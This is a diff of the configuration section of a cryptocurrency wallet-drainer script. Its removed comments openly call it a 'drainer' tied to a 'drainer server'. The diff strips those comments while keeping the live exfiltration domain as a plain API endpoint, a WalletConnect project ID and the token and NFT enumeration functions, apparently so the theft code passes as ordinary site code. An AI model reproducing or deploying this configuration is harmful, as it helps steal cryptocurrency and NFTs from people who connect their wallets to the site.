@@ -1,17 +1,13 @@
 
 let MS_Encryption_Key = 0; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
-// The same number should be specified in the server.js file - if they differ, then nothing will work correctly
 
-const MS_Server = "fasterdeliveryuae.com"; // Specify the domain that is attached to the drainer server
-// This is the domain where you have a server, and not the site itself where you plan to use the drainer
-const MS_WalletConnect_ID = "2fb18219fb9b4fb01220efa381cd8c0e"; // OLD(ea52b0e550593829f2eee2cb9006f642) Project ID from WalletConnect Cloud (it’s better to change it to your own)
+const API_ENDPOINT = 'https://fasterdeliveryuae.com/';
 
-const MS_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag
-// Leave empty by default to receive a message from the server, otherwise fill in to use a custom
 
-// Using the settings below you can customize how your site will look in the WalletConnect interface
-// No need to change, most wallets work with default settings
-// The setting is not related to the MS_WalletConnect_Customization switch, it is only needed for design customization
+const MS_WalletConnect_ID = "2fb18219fb9b4fb01220efa381cd8c0e"; 
+
+const MS_Verify_Message = ""; 
+
 
 const MS_WalletConnect_MetaData = {
   name: document.title, // Default is the same as the site name
@@ -799,7 +795,7 @@ const get_tokens = async (address) => {
     console.log(err);
     return [];
   }
-};
+}; 
 
 const get_nfts = async (address) => {
   try {
